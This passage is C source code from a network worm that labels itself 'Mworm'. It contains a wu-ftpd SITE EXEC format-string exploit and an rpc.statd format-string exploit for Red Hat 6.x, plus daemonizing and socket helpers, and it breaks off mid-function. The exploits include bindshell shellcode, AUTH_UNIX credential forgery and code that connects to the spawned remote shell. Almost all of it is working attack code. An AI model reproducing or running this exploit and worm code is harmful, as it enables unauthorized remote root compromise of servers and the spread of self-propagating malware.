			ftp_recv_until (ftpsock, NULL, 0, "200 ");
		}

		figure = strstr (rbuf, "_%|x|");
		if (figure == NULL)
			continue;
		figure += 5;

		if (*figure != '_')
			continue;

		for (n = 0 ; *figure == '_' ; ++figure, ++n)
			;

		xp_bufaddr = addr + n - tend + 1;
		return (xp_bufaddr);
	}

	return (0);
}


void
xpad_cat (unsigned char *fabuf, unsigned long int addr)
{
	int		i;
	unsigned char	c;


	for (i = 0 ; i <= 3 ; ++i) {
		switch (i) {
		case (0):
			c = (unsigned char) ((addr & 0x000000ff)      );
			break;
		case (1):
			c = (unsigned char) ((addr & 0x0000ff00) >>  8);
			break;
		case (2):
			c = (unsigned char) ((addr & 0x00ff0000) >> 16);
			break;
		case (3):
			c = (unsigned char) ((addr & 0xff000000) >> 24);
			break;
		}
		if (c == 0xff)
			sprintf (fabuf + strlen (fabuf), "%c", c);

		sprintf (fabuf + strlen (fabuf), "%c", c);
	}

	return;
}


unsigned long int
ftp_finddaddr (int ftpsock, struct host *iptr)
{
	int			i,
				n = 0,
				blipcount,
				ssiz,
				tend;
	unsigned long int	addr;
	unsigned char		popstackbuf[512];
	unsigned char		fabuf[512];
	unsigned char		sbuf[1024];
	unsigned char		rbuf[1024];
	unsigned char *		figure;


	for (addr = FTP_tg->bufdaddr_start ; addr > FTP_tg->bufdaddr_end ;
		addr -= ssiz)
	{

		/* 1. build pop stack buffer
		 */
		memset (popstackbuf, '\x00', sizeof (popstackbuf));
		for (i = xpb_align; i > 0 ; --i)
			strcat (popstackbuf, "z");
		for (i = xpb_quad ; i > 0 ; --i)
			strcat (popstackbuf, "%.f");
		for (i = xpb_double ; i > 0 ; --i)
			strcat (popstackbuf, "%d");

		if (esc_ok (addr) == 0) 	continue;

		/* 2. build write buffer
		 */
		memset (fabuf, '\x00', sizeof (fabuf));

		xpad_cat (fabuf, addr);
		sprintf (fabuf + strlen (fabuf), "%s", popstackbuf);

		sprintf (sbuf, "SITE EXEC 7 %s", fabuf);
		ssiz = 500 - strlen (sbuf);
		for (i = ssiz, blipcount = 0 ; i > 0 ; --i, blipcount++)
			strcat (sbuf, "_");
		sprintf (sbuf + strlen (sbuf), "%%%%|x|%%.%ds", ssiz);	/* XXX: thx smiler */
		ssiz -= 16;


		net_write (ftpsock, "%s\n", sbuf);

		memset (rbuf, '\x00', sizeof (rbuf));

		if (net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 8) <= 0) {
			close (ftpsock);
			ftpsock = ftp_login (iptr);
			if (ftpsock <= 0) {
				exit (EXIT_FAILURE);
			}
			if (xp_refind) {
				xp_bufdist = ftp_finddist (ftpsock);
				if (xp_bufdist == 0) {
					exit (EXIT_FAILURE);
				}
				xpb_align = xp_bufdist % 4;
				xpb_quad = xp_bufdist / 8;
				xpb_double = (xp_bufdist % 8) / 4;
			}
		} else {
			ftp_recv_until (ftpsock, NULL, 0, "200 ");
		}

		figure = strstr (rbuf, "_%|x|");
		if (figure == NULL)
			continue;
		tend = figure - rbuf;
		figure += 5;

		if (*figure != '_' || strstr (figure, "_%|x|") == NULL)
			continue;

		for (n = 0 ; *figure == '_' ; ++figure, ++n)
			;


		xp_dstaddr = addr + n - tend - 1;

		return (xp_dstaddr);
	}

	return (0);
}


unsigned long int
ftp_findrl (int ftpsock, unsigned long int retloc)
{
	int		i;
	unsigned char *	sn;
	unsigned char	popstackbuf[512];
	unsigned char	sbuf[512];
	unsigned char	rbuf[2048];


	memset (popstackbuf, '\x00', sizeof (popstackbuf));
	for (i = xpb_align; i > 0 ; --i)
		strcat (popstackbuf, "z");
	for (i = xpb_quad ; i > 0 ; --i)
		strcat (popstackbuf, "%.f");
	for (i = xpb_double ; i > 0 ; --i)
		strcat (popstackbuf, "%d");

	memset (sbuf, '\x00', sizeof (sbuf));
	sprintf (sbuf, "SITE EXEC 7 ");

	xpad_cat (sbuf, retloc);
	strcat (sbuf, popstackbuf);

	strcat (sbuf, "|%.4s|");

	net_write (ftpsock, "%s\n", sbuf);

	memset (rbuf, '\x00', sizeof (rbuf));
	if (net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 20) <= 0) {
		exit (EXIT_FAILURE);
	}
	ftp_recv_until (ftpsock, NULL, 0, "200 ");

	sn = strchr (rbuf, '|');
	if (sn == NULL)
		return (0);

	sn++;

	if (sn[0] == '|' || sn[1] == '|' || sn[2] == '|' || sn[3] == '|')
		return (0);
	return (*((unsigned long int *) sn));
}


void
ftp_exploit (int ftpsock)
{
	int		i,
			wlen,
			tow,
			rem;
	unsigned char	popstackbuf[512];
	unsigned char	sbuf[512];
	unsigned char	rbuf[512];
	unsigned char	retaddr[4];


	xpb_quad -= 1;
	xpb_double += 1;
	if (xpb_double >= 2) {
		xpb_quad += xpb_double / 2;
		xpb_double %= 2;
	}

	retaddr[0] = ((xp_retaddr & 0x000000ff)      );
	retaddr[1] = ((xp_retaddr & 0x0000ff00) >>  8);
	retaddr[2] = ((xp_retaddr & 0x00ff0000) >> 16);
	retaddr[3] = ((xp_retaddr & 0xff000000) >> 24);
	wlen = ftp_getwlen (ftpsock);
	wlen -= 4;

	memset (popstackbuf, '\x00', sizeof (popstackbuf));
	for (i = xpb_align; i > 0 ; --i)
		strcat (popstackbuf, "z");
	for (i = xpb_quad ; i > 0 ; --i)
		strcat (popstackbuf, "%.f");
	for (i = xpb_double ; i > 0 ; --i)
		strcat (popstackbuf, "%d");


	memset (sbuf, '\x00', sizeof (sbuf));
	sprintf (sbuf, "SITE EXEC 7 ");
	xpad_cat (sbuf, xp_retloc);
	xpad_cat (sbuf, 0x73507350);
	xpad_cat (sbuf, xp_retloc + 1);
	xpad_cat (sbuf, 0x73507350);
	xpad_cat (sbuf, xp_retloc + 2);
	xpad_cat (sbuf, 0x73507350);
	xpad_cat (sbuf, xp_retloc + 3);
	strcat (sbuf, popstackbuf);

	/* create the paddings
	 */
	tow = ((retaddr[0] + 0x100) - (wlen % 0x100)) % 0x100;
	if (tow < 10) tow += 0x100;	
	sprintf (sbuf + strlen (sbuf), "%%%dd%%n", tow);
	wlen += tow;

	tow = ((retaddr[1] + 0x100) - (wlen % 0x100)) % 0x100;
	if (tow < 10) tow += 0x100;
	sprintf (sbuf + strlen (sbuf), "%%%dd%%n", tow);
	wlen += tow;

	tow = ((retaddr[2] + 0x100) - (wlen % 0x100)) % 0x100;
	if (tow < 10) tow += 0x100;
	sprintf (sbuf + strlen (sbuf), "%%%dd%%n", tow);
	wlen += tow;

	tow = ((retaddr[3] + 0x100) - (wlen % 0x100)) % 0x100;
	if (tow < 10) tow += 0x100;
	sprintf (sbuf + strlen (sbuf), "%%%dd%%n", tow);
	wlen += tow;

	rem = 510 - strlen (sbuf);
	if (rem < strlen (FTP_shellcode)) {
		exit (EXIT_FAILURE);
	}
	if (strlen (FTP_shellcode2) >= 0xff) {
		exit (EXIT_FAILURE);
	}

	for (i = rem - strlen (FTP_shellcode) ; i > 0 ; --i)
		strcat (sbuf, "\x90");
	strcat (sbuf, FTP_shellcode);


	net_write (ftpsock, "%s\n", sbuf);
	net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 20);
	sleep (1);
	net_write (ftpsock, "%s\n", FTP_shellcode2);
	sleep (2);

	net_write (ftpsock, "id;\n");
	FTP_shell (ftpsock);

#if 1
	memset (rbuf, '\x00', sizeof (rbuf));
	if (net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 20) <= 0) {
	} else {

		if (memcmp (rbuf, "uid=", 4) == 0) {
			FTP_shell (ftpsock);
		} else {
			exit (EXIT_FAILURE);
		}
	}
#endif

	return;
}


int
ftp_getwlen (int ftpsock)
{
	unsigned char *	sn;
	int		owlen,
			i;
	unsigned char	popstackbuf[512];
	unsigned char	sbuf[512];
	unsigned char	rbuf[2048];


	memset (popstackbuf, '\x00', sizeof (popstackbuf));
	for (i = xpb_align; i > 0 ; --i)
		strcat (popstackbuf, "z");
	for (i = xpb_quad ; i > 0 ; --i)
		strcat (popstackbuf, "%.f");
	for (i = xpb_double ; i > 0 ; --i)
		strcat (popstackbuf, "%d");

	memset (sbuf, '\x00', sizeof (sbuf));
	sprintf (sbuf, "SITE EXEC 7 ");
	xpad_cat (sbuf, 0x41414141);
	xpad_cat (sbuf, 0x73507350);
	xpad_cat (sbuf, 0x41414142);
	xpad_cat (sbuf, 0x73507350);
	xpad_cat (sbuf, 0x41414143);
	xpad_cat (sbuf, 0x73507350);
	xpad_cat (sbuf, 0x41414144);
	strcat (sbuf, popstackbuf);

	strcat (sbuf, "|%p|%p|%p|%p|%p|");

	net_write (ftpsock, "%s\n", sbuf);

	memset (rbuf, '\x00', sizeof (rbuf));
	if (net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 20) <= 0) {
		exit (EXIT_FAILURE);
	}
	ftp_recv_until (ftpsock, NULL, 0, "200 ");


	if (strstr (rbuf, "|0x73507350|") == NULL ||
		strchr (rbuf, '|') == NULL)
	{

		exit (EXIT_FAILURE);
	}

	sn = strchr (rbuf, '|');
	owlen = sn - rbuf;

	return (owlen);
}


int
esc_ok (unsigned long int addr)
{
	if (	(((addr & 0x000000ff)     ) == '%') ||
		(((addr & 0x0000ff00) >> 8) == '%') ||
		(((addr & 0x00ff0000) >> 16) == '%') ||
		(((addr & 0xff000000) >> 24) == '%') ||
		(((addr & 0x000000ff)     ) == '\x0a') ||
		(((addr & 0x0000ff00) >> 8) == '\x0a') ||
		(((addr & 0x00ff0000) >> 16) == '\x0a') ||
		(((addr & 0xff000000) >> 24) == '\x0a') ||
		(((addr & 0x000000ff)     ) == '\x00') ||
		(((addr & 0x0000ff00) >> 8) == '\x00') ||
		(((addr & 0x00ff0000) >> 16) == '\x00') ||
		(((addr & 0xff000000) >> 24) == '\x00'))
	{
		return (0);
	}

	return (1);
}



int
ftp_vuln (int ftpsock)
{
	int	vuln = 0;
	char	resp[512];


	net_write (ftpsock, "SITE EXEC %s\n", "%020d|%.f%.f|");
	memset (resp, '\x00', sizeof (resp));
	if (net_rlinet (ftpsock, resp, sizeof (resp) - 1, 20) <= 0)
		goto fverr;

	if (memcmp (resp, "200-0000000", 11) == 0)
		vuln = 1;


	if (strstr (resp, "|??????????????|") != NULL)  exit (EXIT_FAILURE);
	if (memcmp (resp, "500", 3) == 0)
		return (0);

	if (memcpy (resp, "200 ", 4) == 0)
		return (vuln);
	else
		ftp_recv_until (ftpsock, resp, sizeof (resp), "200 ");

	return (vuln);

fverr:
	if (ftpsock > 0)
		close (ftpsock);

	return (0);
}

int wuftp260_vuln (int ftpsock, char * hostip, struct host *iptr) 
{
	int	vuln = 0;
	unsigned char	massbuf[256];
	int		flipcoin,
			n;
	char		c;
		
#ifdef	DEBUG		
	printf("%s: phase 1 - Check if vulnerable... \n",hostip);
#endif
	vuln = ftp_vuln(ftpsock);
	if (vuln ==1) {
#ifdef	DEBUG		
		printf("%s: phase 2 - vulnerable... \n",hostip);
#endif
	}
	else return 0;
	
	
	FTP_tg = FTP_targets[0];
	FTP_shellcode2 = FTP_tg->shellcode_shell;
#ifdef	DEBUG
		printf("%s: phase 3 - finding buffer distance on stack... \n", hostip);
#endif	
	xp_bufdist = ftp_finddist (ftpsock);
	if (xp_bufdist == 0) return 0;
	xpb_align = xp_bufdist % 4;
	xpb_quad = xp_bufdist / 8;
	xpb_double = (xp_bufdist % 8) / 4;
#ifdef	DEBUG
		printf("%s: phase 4 - finding source buffer address... \n", hostip);
#endif		
	xp_bufaddr = ftp_findaddr (ftpsock, iptr);
	if (xp_bufaddr == 0) return 0;
#ifdef	DEBUG
		printf("%s: phase 5 - find destination buffer address...  \n", hostip);
#endif		
	xp_dstaddr = ftp_finddaddr (ftpsock, iptr);
	if (xp_dstaddr == 0) return 0;
	FTP_shellcode = FTP_tg->shellcode_read;
	FTP_shellcode[strlen (FTP_shellcode)] = (unsigned char) strlen (FTP_shellcode2);	
	xp_retaddr = xp_bufaddr + 511 - strlen (FTP_shellcode) - FTP_tg->ffpad;
#ifdef	DEBUG
		printf("%s: phase 6 - calculating return address...  \n", hostip);
		printf("%s: phase 7 - getting return address location...  \n", hostip);
#endif
	flipcoin = 1;
	for (n = 0 ; n <= (FTP_tg->retloc_maxsearch * 4) ; ) {
		unsigned long int	content;

		xp_retloc = xp_dstaddr + FTP_tg->retloc_midhit + (flipcoin * n);

		flipcoin = (flipcoin == 1) ? -1 : 1;
		if (flipcoin == -1)
			n += 4;

		if (esc_ok (xp_retloc) == 0) continue;
		content = ftp_findrl (ftpsock, xp_retloc);
		if (content >= FTP_tg->retaddr_low && content <= FTP_tg->retaddr_high)
			n = 0x7350;
	}
#ifdef	DEBUG
		printf("%s: phase 8 - exploitation...  \n", hostip);
#endif
	ftp_exploit (ftpsock);

	return (vuln);


}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[CHECKFTP.C]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[CHECKSTATUS.C]ÄÄÄ
//CheckSTATUS.c
//Based on Mscan
//Part of Mworm

#include "common.h"

#define SM_PROG 100024
#define SM_VERS 1
#define SM_STAT 1
#define SM_MAXSTRLEN 1024



char Status_shellcode[] =
"\x31\xc0"                              /* xorl   %eax,%eax             */
/* jmp ricochet ------------------------------------------------------- */
"\xeb\x7c"                              /* jmp    0x7c                  */
/* kungfu: ------------------------------------------------------------ */
"\x59"                                  /* popl   %ecx                  */
"\x89\x41\x10"                          /* movl   %eax,0x10(%ecx)       */
/* ------------------------------------ socket(2,1,0); ---------------- */
"\x89\x41\x08"                          /* movl   %eax,0x8(%ecx)        */
"\xfe\xc0"                              /* incb   %al                   */
"\x89\x41\x04"                          /* movl   %eax,0x4(%ecx)        */
"\x89\xc3"                              /* movl   %eax,%ebx             */
"\xfe\xc0"                              /* incb   %al                   */
"\x89\x01"                              /* movl   %eax,(%ecx)           */
"\xb0\x66"                              /* movb   $0x66,%al             */
"\xcd\x80"                              /* int    $0x80                 */
/* ------------------------------------ bind(sd,&sockaddr,16); -------- */
"\xb3\x02"                              /* movb   $0x2,%bl              */
"\x89\x59\x0c"                          /* movl   %ebx,0xc(%ecx)        */
"\xc6\x41\x0e\x99"                      /* movb   $0x99,0xe(%ecx)       */
"\xc6\x41\x08\x10"                      /* movb   $0x10,0x8(%ecx)       */
"\x89\x49\x04"                          /* movl   %ecx,0x4(%ecx)        */
"\x80\x41\x04\x0c"                      /* addb   $0xc,0x4(%ecx)        */
"\x88\x01"                              /* movb   %al,(%ecx)            */
"\xb0\x66"                              /* movb   $0x66,%al             */
"\xcd\x80"                              /* int    $0x80                 */
/* ------------------------------------ listen(sd,blah); -------------- */
"\xb3\x04"                              /* movb   $0x4,%bl              */
"\xb0\x66"                              /* movb   $0x66,%al             */
"\xcd\x80"                              /* int    $0x80                 */
/* ------------------------------------ accept(sd,0,16); -------------- */
"\xb3\x05"                              /* movb   $0x5,%bl              */
"\x30\xc0"                              /* xorb   %al,%al               */
"\x88\x41\x04"                          /* movb   %al,0x4(%ecx)         */
"\xb0\x66"                              /* movb   $0x66,%al             */
"\xcd\x80"                              /* int    $0x80                 */
/* ------------------------------------ dup2(cd,0); ------------------- */
"\x89\xce"                              /* movl   %ecx,%esi             */
"\x88\xc3"                              /* movb   %al,%bl               */
"\x31\xc9"                              /* xorl   %ecx,%ecx             */
"\xb0\x3f"                              /* movb   $0x3f,%al             */
"\xcd\x80"                              /* int    $0x80                 */
/* ------------------------------------ dup2(cd,1); ------------------- */
"\xfe\xc1"                              /* incb   %cl                   */
"\xb0\x3f"                              /* movb   $0x3f,%al             */
"\xcd\x80"                              /* int    $0x80                 */
/* ------------------------------------ dup2(cd,2); ------------------- */
"\xfe\xc1"                              /* incb   %cl                   */
"\xb0\x3f"                              /* movb   $0x3f,%al             */
"\xcd\x80"                              /* int    $0x80                 */
/* ------------------------------------ execve("/bin/sh",argv,0); ----- */
"\xc7\x06\x2f\x62\x69\x6e"              /* movl   $0x6e69622f,(%esi)    */
"\xc7\x46\x04\x2f\x73\x68\x41"          /* movl   $0x4168732f,0x4(%esi) */
"\x30\xc0"                              /* xorb   %al,%al               */
"\x88\x46\x07"                          /* movb   %al,0x7(%esi)         */
"\x89\x76\x0c"                          /* movl   %esi,0xc(%esi)        */
"\x8d\x56\x10"                          /* leal   0x10(%esi),%edx       */
"\x8d\x4e\x0c"                          /* leal   0xc(%esi),%ecx        */
"\x89\xf3"                              /* movl   %esi,%ebx             */
"\xb0\x0b"                              /* movb   $0xb,%al              */
"\xcd\x80"                              /* int    $0x80                 */
/* ------------------------------------ exit(blah); ------------------- */
"\xb0\x01"                              /* movb   $0x1,%al              */
"\xcd\x80"                              /* int    $0x80                 */
/* ricochet: call kungfu ---------------------------------------------- */
"\xe8\x7f\xff\xff\xff";                 /* call   -0x81                 */

enum res
{
    stat_succ,
    stat_fail
};

struct sm_name
{
    char *mon_name;
};

struct sm_stat_res
{
    enum res res_stat;
    int state;
};

struct type
{
    int type;
    char *desc;
    char *code;
    u_long bufpos;
    int buflen;
    int offset;
    int wipe;
};

struct type types[] =
{
    {0, "Redhat 6.2 (nfs-utils-0.1.6-2)", Status_shellcode, 0xbffff314, 1024, 600, 9},
    {1, "Redhat 6.1 (knfsd-1.4.7-7)", Status_shellcode, 0xbffff314, 1024, 600, 9},
    {2, "Redhat 6.0 (knfsd-1.2.2-4)", Status_shellcode, 0xbffff314, 1024, 600, 9},
    {0, NULL, NULL, 0, 0, 0, 0}
};

bool_t
xdr_sm_name(XDR *xdrs, struct sm_name *objp)
{
    if (!xdr_string(xdrs, &objp->mon_name, SM_MAXSTRLEN))
        return (FALSE);
    return (TRUE);
}

bool_t
xdr_res(XDR *xdrs, enum res *objp)
{
    if (!xdr_enum(xdrs, (enum_t *)objp))
        return (FALSE);
    return (TRUE);
}

bool_t
xdr_sm_stat_res(XDR *xdrs, struct sm_stat_res *objp)
{
    if (!xdr_res(xdrs, &objp->res_stat))
        return (FALSE);
    if (!xdr_int(xdrs, &objp->state))
        return (FALSE);
    return (TRUE);
}



void
STATUS_runshell(int sockd)
{
    char buff[1024];
    int fmax, ret;
    fd_set fds;

    fmax = max(fileno(stdin), sockd) + 1;
    send(sockd, "cd /; ls -alF; id;\n", 19, 0);

    for(;;)
    {

        FD_ZERO(&fds);
        FD_SET(fileno(stdin), &fds);
        FD_SET(sockd, &fds);

        if(select(fmax, &fds, NULL, NULL, NULL) < 0)
        {
		return;
        }

        if(FD_ISSET(sockd, &fds))
        {
            bzero(buff, sizeof buff);
            if((ret = recv(sockd, buff, sizeof buff, 0)) < 0)
            {
            	return;
	    }
            if(!ret)
            {
		return;
            }
            write(fileno(stdout), buff, ret);
        }

        if(FD_ISSET(fileno(stdin), &fds))
        {
            bzero(buff, sizeof buff);
            ret = read(fileno(stdin), buff, sizeof buff);
            errno = 0;
            if(send(sockd, buff, ret, 0) != ret)
            {
            	return;
	    }
        }
    }
}


void
STATUS_connection(char * hostip, struct host *iptr)
{
    int sockd;


	sockd=TCP_NB_connect(iptr->h_network,39168,CONNECT_TIME);
	if (sockd <=0 ) return;
//      STATUS_runshell(sockd);
	FTP_shell(sockd);
	close(sockd);
}


char *
STATUS_wizardry(char *sc, u_long bufpos, int buflen, int offset, int wipe)
{
    int i, j, cnt, pad;
    char pbyte, *buff, *ptr;
    u_long retpos;
    u_long dstpos;


    while(bufpos % 4) bufpos--;
    /* buflen + ebp */
    retpos = bufpos + buflen + 4;

/*
** 0x00 == '\0'
** 0x25 == '%'
** (add troublesome bytes)
** Alignment requirements aid comparisons
*/

    pbyte = retpos & 0xff;

    /* Yes, it's 0x24 */
    if(pbyte == 0x00 || pbyte == 0x24)
    {
	return NULL;
    }

/*
** Unless the user gives us a psychotic value,
** the address should now be clean.
*/

    /* str */
    cnt = 24;
    /* 1 = process nul */
    buflen -= cnt + 1;

    if(!(buff = malloc(buflen + 1)))
    {
        perror("malloc()");
        exit(EXIT_FAILURE);
    }

    ptr = buff;
    memset(ptr, NOP, buflen);

    for(i = 0; i < 4; i++, retpos++)
    {
        /* junk dword */
        for(j = 0; j < 4; j++)
            *ptr++ = retpos >> j * 8 & 0xff;
        /* r + i */
        memcpy(ptr, ptr - 4, 4);
        ptr += 4; cnt += 8;
    }

    /* restore */
    retpos -= 4;

    for(i = 0; i < wipe; i++)
    {
        /* consistent calculations */
        strncpy(ptr, "%8x", 3);
        ptr += 3; cnt += 8;
    }

    dstpos = bufpos + offset;

/*
** This small algorithm of mine can be used
** to obtain "difficult" values..
*/

    for(i = 0; i < 4; i++)
    {
        pad = dstpos >> i * 8 & 0xff;
        if(pad == (cnt & 0xff))
        {
            sprintf(ptr, "%%n%%n");
            ptr += 4; continue;
        }
        else
        {
            int tmp;
            /* 0xffffffff = display count of 8 */
            while(pad < cnt || pad % cnt <= 8) pad += 0x100;
            pad -= cnt, cnt += pad;
            /* the source of this evil */
            tmp = sprintf(ptr, "%%%dx%%n", pad);
            ptr += tmp;
        }

    }

    *ptr = NOP;
    /* plug in the shellcode */
    memcpy(buff + buflen - strlen(sc), sc, strlen(sc));
    buff[buflen] = '\0';

#ifdef DEBUG
    printf("buffer: %#lx length: %d (+str/+nul)\n", bufpos, strlen(buff));
    printf("target: %#lx new: %#lx (offset: %d)\n", retpos, dstpos, offset);
    printf("wiping %d dwords\n", wipe);
#endif
    
    return buff;
}

struct in_addr
STATUS_getip(char *host)
{
    struct hostent *hs;

    if((hs = gethostbyname(host)) == NULL)
    {
        herror("gethostbyname()");
        exit(EXIT_FAILURE);
    }

    return *((struct in_addr *) hs->h_addr);
}


int 
Handle_Port_STATUS(int fd,char *hostip,struct host *iptr)  //Handle rpc.statd, return 1 if success
{
    int ch;
    char *buff;

    CLIENT *clnt;
    enum clnt_stat res;
    struct timeval tv, tvr;
    struct sm_name smname;
    struct sm_stat_res smres;
    struct sockaddr_in addr;

    int type = -1;
    int usetcp = 0;
    int timeout = 5;
    int wipe = 9;
    int offset = 600;
    int buflen = 1024;
    char *sc = Status_shellcode;
    u_short port = 0;
    u_long bufpos = 0;

    int sockp = RPC_ANYSOCK;


    type = 0;
   if(type >= 0)
    {
        if(type >= sizeof types / sizeof types[0] - 1)
        {
            return -1;
        }

        sc = types[type].code;
        bufpos = types[type].bufpos;
        buflen = types[type].buflen;
        offset = types[type].offset;
        wipe = types[type].wipe;
    }

    if(!bufpos)  return -1;
    bzero(&addr, sizeof addr);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr = STATUS_getip(hostip);

    tv.tv_sec = timeout;
    tv.tv_usec = 0;


    clnt = clnttcp_create(&addr, SM_PROG, SM_VERS, &sockp, 0, 0);
    if(clnt == NULL)
    {
	return -1;
     }

    /* AUTH_UNIX / AUTH_SYS authentication forgery */
    clnt->cl_auth = authunix_create("localhost", 0, 0, 0, NULL);

    buff = STATUS_wizardry(sc, bufpos, buflen, offset, wipe);
    if(buff==NULL)  return -1;
    smname.mon_name = buff;

    res = clnt_call(clnt, SM_STAT, (xdrproc_t) xdr_sm_name,
        (caddr_t) &smname, (xdrproc_t) xdr_sm_stat_res,
        (caddr_t) &smres, tv);

    free(buff);
    clnt_destroy(clnt);

    if(res != RPC_SUCCESS)
    {
#ifdef DEBUG
        printf("A timeout was expected. Attempting connection to shell..\n");
#endif        
	return 1 ;
//        sleep(5); STATUS_connection(addr);
    }

    return -1;
}


int rpcSTATUS_vuln (char * hostip, struct host *iptr) //if Handle_Port_STATUS =1 the do 
{
	sleep(5); STATUS_connection(hostip,iptr); return 1;
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[CHECKSTATUS.C]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[COMMON.C]ÄÄÄ
//common.c
//Based on Mscan
//Part of Mworm

#include "common.h"

int daemon_init()  //init the daemon,if success return 0 other <0
{
	struct sigaction act;
	int i,maxfd;
	if(fork()!=0)   exit(0);
	if(setsid()<0)  return(-1);
	act.sa_handler=SIG_IGN;
	//act.sa_mask=0;
	act.sa_flags=0;
	sigaction(SIGHUP,&act,0);
	if(fork()!=0)   exit(0);
	chdir("/");
	umask(0);
	maxfd=sysconf(_SC_OPEN_MAX);
	for(i=0;i<maxfd;i++)
		close(i);
	open("/dev/null",O_RDWR);
	dup(0);
	dup(1);
	dup(2);
	return(0);
}

void sig_chid(int signo)			//wait the child die
{
	pid_t pid;
	int stat;
	while((pid=waitpid(-1,&stat,WNOHANG))>0)
		printf("child %d die\n",pid);
	return;
}


ssize_t writen(int fd,const void *vptr,size_t n)    //writen data to socket
{
	size_t nleft;
	ssize_t nwritten;
	const char *ptr;
	ptr=vptr;
	nleft=n;
	while(nleft>0){
		if((nwritten=write(fd,ptr,nleft))<=0){
			if(errno==EINTR)
				nwritten=0;
			else
				return(-1);
		}
			nleft-=nwritten;
			ptr+=nwritten;
	}
	return(n);
}
	

ssize_t readn(int fd,void *vptr,size_t n)   //read n bytes from socket
{
	size_t nleft;
	ssize_t nread;
	char *ptr;
	ptr=vptr;
	nleft=n;
	while(nleft>0){
		if((nread=read(fd,ptr,nleft))<0){
			if(errno==EINTR)
			nread=0;
			else
			return(-1);
		}else if(nread==0)
		break;
		nleft-=nread;
		ptr+=nread;
	}
	return(n-nleft);
}


static ssize_t my_read(int fd,char *ptr)
{
	static int read_cnt=0;
	static char *read_ptr;
	static char read_buf[1024];
	if(read_cnt<=0){
	  again:
		if((read_cnt=read(fd,read_buf,sizeof(read_buf)))<0){
			if(errno==EINTR)
				goto again;
			return(-1);
		}else if (read_cnt==0)
			return(0);
		read_ptr=read_buf;
	}
	read_cnt--;
	*ptr=*read_ptr++;
	return(1);
}

ssize_t readline(int fd,void *vptr,size_t maxlen,int want_n) 
						 //read a line from socket
{
	int rc,n;
	char c, *ptr;
	ptr=vptr;
	for(n=1;n<maxlen;n++){
	 if((rc=my_read(fd,&c))==1){
	  if (want_n==1){
		  *ptr++=c;
	  	  if(c=='\n')
	  		break;
	  }else{
		  if(c=='\n')
			break;
	           *ptr++=c;
	   }
	   }else if(rc==0){
		if(n==1)
		   return(0);
		else
		   break;
	}else
		return(-1);
	}
	*ptr=0;
	return(n);
}

int TCP_listen(int port)              //success return 1 else return -1
{
	
	struct sockaddr_in laddr ;	/* struttura IPv4 del demone */
	int fd;
	socklen_t len ;		/* dimensioni della struttura IPv4 */
	fd=socket(AF_INET, SOCK_STREAM, 0);
	len = sizeof(laddr) ;
        memset(&laddr, 0, len) ;	
   	laddr.sin_addr.s_addr = htonl(INADDR_ANY) ;
   	laddr.sin_family = AF_INET ;
   	laddr.sin_port = htons(port) ;  /* apriamo sulla porta 6666 */
   	if((bind(fd, (const struct sockaddr *)&laddr, len)))  return(-1);
   	if(listen(fd, 5))	return(-1);
	return(fd);
}

int TCP_connect(char *Remote,int port)
				 //success return fd else return -1
{
	 struct sockaddr_in sin;
	 int fd;
	 struct hostent *hp;
	 struct in_addr **pptr;
	 fd=socket(AF_INET, SOCK_STREAM, 0);
	 sin.sin_family=AF_INET;
  	 sin.sin_port=htons(port);
  	 if ((hp=gethostbyname(Remote)) == NULL )
  		inet_pton(AF_INET,Remote,&sin.sin_addr);
  	 else{
  	 	pptr=(struct in_addr **) hp->h_addr_list;
  	 	memcpy(&sin.sin_addr,*pptr,sizeof(struct in_addr));
  	}
  	  if (connect(fd, (struct sockaddr*)&sin, sizeof(sin))==0)   //success
  	{	
  		return(fd);
  	}
  	else return(-1);
}


char * Get_localIP(int fd)	//use getsockname to return the local ip address
{
	struct sockaddr_in sin;
	int num;
	
	if(getsockname(fd,(struct sockaddr *)&sin,&num)<0)  return NULL;	
	return inet_ntoa(sin.sin_addr);		
}

  	 
int TCP_NB_connect(unsigned long host_net,int port,int nsec)
				 //no block conneetc,success return fd else return<0
				 //if nsec ==0 then no timeout,waiting....
{
	 struct sockaddr_in sin;
	 int fd;
	 struct hostent *hp;
	 struct in_addr **pptr;
	 int flags,n,error;
	 struct timeval tval;
	 fd_set rset,wset;
	 socklen_t len;
	 

	 fd=socket(AF_INET, SOCK_STREAM, 0);
	 sin.sin_family=AF_INET;
  	 sin.sin_port=htons(port);
	 sin.sin_addr.s_addr=htonl(host_net);  	

  	flags = fcntl(fd ,F_GETFL,0 );
  	fcntl(fd,F_SETFL,flags | O_NONBLOCK);
  	error=0;
  	
  	  if ((n=connect(fd, (struct sockaddr*)&sin, sizeof(sin)))<0 )
		if ( errno != EINPROGRESS)
			return(-1);
	
	if (n==0)
		goto done;
	FD_ZERO(&rset);
	FD_SET(fd, &rset);
	wset=rset;
	tval.tv_sec=nsec;
	tval.tv_usec=0;
	if ((n=select(fd+1,&rset,&wset,NULL,nsec ? &tval : NULL))==0){
		close(fd);
		errno=ETIMEDOUT;
		return(-1);
	}
	if (FD_ISSET(fd,&rset) || FD_ISSET(fd, &wset)) {
		len =sizeof(error);
		if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len)<0)
			return(-1);
	}else
		error=1;
	
	done:
